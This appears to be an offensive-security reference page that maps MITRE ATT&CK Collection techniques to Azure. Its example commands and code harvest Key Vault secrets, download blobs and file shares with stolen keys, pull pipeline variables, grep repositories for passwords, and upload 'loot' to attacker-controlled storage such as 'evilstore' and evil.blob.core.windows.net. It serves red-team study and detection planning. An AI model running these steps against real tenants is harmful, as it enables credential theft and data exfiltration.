# Collection TA0009

## Overview

In Azure environments, TA0009 – Collection refers to the stage where attackers, after gaining access, begin harvesting sensitive data such as secrets, credentials, configurations, storage contents, and database records. Leveraging Azure-native services like Key Vault, Blob Storage, Azure SQL, and DevOps Repos, adversaries may use legitimate APIs and tools (e.g., Azure CLI, SDKs, or Automation Runbooks) to automate data collection. Common tactics include enumerating all secrets in a Key Vault, dumping blob contents using stolen SAS tokens, extracting credentials from pipeline variables or configuration files, and staging collected data in attacker-controlled or compromised storage accounts. These techniques often blend in with normal cloud operations, making them harder to detect unless proper logging, anomaly detection, and least-privilege access models are in place.

### T1119 – **Automated Collection**

Adversaries abuse Azure Automation, Logic Apps, and Functions to script the collection of data.

#### Attack Examples:

* Create a malicious runbook to collect and exfiltrate Key Vault secrets:

```powershell
az automation runbook create --automation-account MalAuto --name CollectSecrets --type PowerShell
```

* Abuse Logic Apps to pull data from SharePoint, Outlook, or SQL DB:

```json
"trigger": {
  "type": "Recurrence",
  "frequency": "Minute",
  "interval": 5
},
"actions": {
  "get_secret": {
    "type": "Http",
    "inputs": {
      "method": "GET",
      "uri": "https://myvault.vault.azure.net/secrets/SecretName?api-version=7.1"
    }
  }
}
```

* Use Azure Functions as persistent backdoors to automate dumps:

```python
// Timer-triggered function to pull secrets
import logging
import azure.functions as func
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

def main(mytimer: func.TimerRequest) -> None:
    if mytimer.past_due:
        logging.warning("The timer is past due!")

    # Replace with your actual Key Vault URI
    key_vault_url = "https://<your-keyvault-name>.vault.azure.net/"

    # Use managed identity or Azure CLI for auth
    credential = DefaultAzureCredential()

    # Initialize SecretClient
    secret_client = SecretClient(vault_url=key_vault_url, credential=credential)

    logging.info(f"[*] Enumerating secrets in: {key_vault_url}")

    # List all secret properties
    try:
        secret_properties = secret_client.list_properties_of_secrets()

        for secret_prop in secret_properties:
            secret_name = secret_prop.name
            secret = secret_client.get_secret(secret_name)

            # Log or exfiltrate the secret value (⚠️ only log for PoC/testing!)
            logging.info(f"[+] Secret: {secret.name} = {secret.value}")

    except Exception as e:
        logging.error(f"[!] Error accessing secrets: {e}")
```

### T1530 – **Data from Cloud Storage Object**

Adversaries access Azure Storage (Blobs, Queues, Files) to collect sensitive data.

#### Attack Examples:

* Use stolen keys or tokens to list and download blob contents:

```powershell
az storage blob list --account-name victimstorage --container-name sensitive --auth-mode key
az storage blob download --container-name sensitive --name db-backup.bak --file loot.bak
```

* Abuse **misconfigured public blobs**:

```bash
# Public URL access without auth
https://victimstorage.blob.core.windows.net/backups/secret.zip
```

* Extract files from **File Shares** (if SMB access is allowed):

```bash
az storage share list --account-name victimstorage
az storage file download --share-name sharedfiles --path finance.xlsx --dest ./finance.xlsx
```

### T1213 – **Data from Information Repositories**

Includes:

* **T1213.001 – Databases**
* **T1213.003 – Code Repositories**

#### 💥 Attack Examples:

**T1213.001 – Azure SQL / Cosmos DB / Table Storage:**

* Query sensitive data post-compromise:

```sql
SELECT * FROM users WHERE is_admin=1;
```

* Abuse leaked connection strings from `local.settings.json` or pipeline variables:

```bash
az cosmosdb sql query --account-name mydb --query "SELECT * FROM Orders"
```

**T1213.003 – Azure DevOps:**

* Clone Git repos to extract hardcoded secrets, tokens:

```bash
git clone https://dev.azure.com/org/project/_git/repo
```

* Pull pipeline secrets and variables:

```bash
az pipelines variable list --org https://dev.azure.com/org --project proj
```

* Search repos for secrets:

```bash
git grep -i "apikey\|password\|secret"
```

### T1074.002 – **Data Staged: Cloud Storage (Remote Data Staging)**

Adversaries temporarily stage stolen data in cloud storage to prep for exfil.

#### 💥 Attack Examples:

* Upload collected loot to attacker-controlled Azure Storage:

```bash
az storage blob upload --account-name evilstore --container-name staging --file secrets.zip --name staging.zip
```

* Use compromised internal storage account as a staging area to blend in:

```bash
az storage blob upload --container-name temp --file ./loot.txt --name creds.txt
```

* Abuse Azure Functions or Logic Apps to write staged data:

```csharp
// Function writes loot to attacker container
var blobClient = new BlobClient("https://evil.blob.core.windows.net/stash/loot.txt", cred);
blobClient.Upload(BinaryData.FromString("stolen secrets"));
```

### ✅ Summary Table

| MITRE Technique                   | Azure Attack Example                                                |
| --------------------------------- | ------------------------------------------------------------------- |
| **T1119** Automated Collection    | Automation Runbooks, Logic Apps, Azure Functions harvesting secrets |
| **T1530** Cloud Storage Object    | Blob listing/downloading via stolen keys or public blobs            |
| **T1213.001** DB Repositories     | SQL/Cosmos DB queries with stolen creds or tokens                   |
| **T1213.003** Code Repos          | Clone repos, extract secrets from Azure DevOps/GitHub               |
| **T1074.002** Remote Data Staging | Upload loot to Azure Storage for exfil or persistence               |
